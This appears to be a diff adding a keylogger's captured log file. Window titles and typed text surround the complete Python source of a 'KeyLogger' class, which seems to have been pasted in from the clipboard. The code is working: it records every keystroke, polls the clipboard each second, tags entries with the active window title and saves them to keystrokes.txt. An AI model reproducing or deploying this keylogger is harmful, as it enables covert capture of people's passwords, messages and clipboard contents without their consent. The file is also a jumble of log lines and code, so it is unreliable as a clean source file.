@@ -1,0 +1,91 @@
+[WINDOW] Pegasus (spyware) | Description, Origins, Spying, & Controversies | Britannica - Google Chrome
+[WINDOW] Yes | Members, Albums, Songs, & Facts | Britannica - Google Chrome
+[WINDOW] Search engine | Definition, History, Optimization, Indexing, & Facts | Britannica - Google Chrome
+from pynput import keyboard
+import pygetwindow as gw
+import pyperclip
+import time
+import threading
+
+class KeyLogger:
+
+    def __init__(self):
+        self.current_line = ""
+        self.keystrokes = []
+        self.running = True
+        self.last_clipboard_content = ""
+        self.current_window_title = ""
+
+    def get_active_window_title(self):
+        # Get the title of the current active window
+        return gw.getActiveWindowTitle()
+
+    def on_key_press(self, key):
+        # Before processing the keystroke, check if the active window has changed
+        current_window = self.get_active_window_title()
+        if current_window != self.current_window_title:
+            self.keystrokes.append(f"[WINDOW] {current_window}")
+            self.current_window_title = current_window 
+        try:
+            if key == keyboard.Key.enter:
+                if self.current_line:  # If there's content in the current line, append it to the log
+                    self.keystrokes.append(self.current_line)
+                    self.current_line = ""
+            elif key == keyboard.Key.space:
+                self.current_line += " "
+            elif key == keyboard.Key.backspace:
+                self.current_line = self.current_line[:-1]
+            elif isinstance(key, keyboard.KeyCode):
+                self.current_line += key.char
+        except AttributeError:
+            pass
+
+    def on_key_release(self, key):
+        if key == keyboard.Key.esc:
+            if self.current_line:  # Save the current line if there's any content before stopping
+                self.keystrokes.append(self.current_line)
+            self.save_keystrokes()
+            self.stop()
+            return False
+
+    def save_keystrokes(self):
+     with open("keystrokes.txt", "w", encoding="utf-8") as f:
+        f.write("\n".join(self.keystrokes))
+
+
+    def is_valid_clipboard_content(self, content):
+        if len(content.strip()) < 2:
+            return False
+        return True
+
+    def check_clipboard(self):
+        while self.running:
+            try:
+                clipboard_content = pyperclip.paste()
+                if clipboard_content != self.last_clipboard_content and self.is_valid_clipboard_content(clipboard_content):
+                    self.current_line = clipboard_content  # Replace the current line with clipboard content
+                    self.last_clipboard_content = clipboard_content
+            except Exception as e:
+                print(f"Error reading clipboard: {e}")
+            time.sleep(1)
+
+    def stop(self):
+        self.running = False
+
+    def run(self):
+        # Start a thread for checking the clipboard
+        clipboard_thread = threading.Thread(target=self.check_clipboard)
+        clipboard_thread.start()
+
+        # Start the keyboard listener on the main thread
+        with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
+            listener.join()
+
+        # Wait for the clipboard thread to terminate before exiting
+        clipboard_thread.join()
+
+if __name__ == "__main__":
+    logger = KeyLogger()
+    logger.run()
+but let me say butler yesokay i got the searchahh fuck indeed
+[WINDOW] Command Prompt - python  browser.py
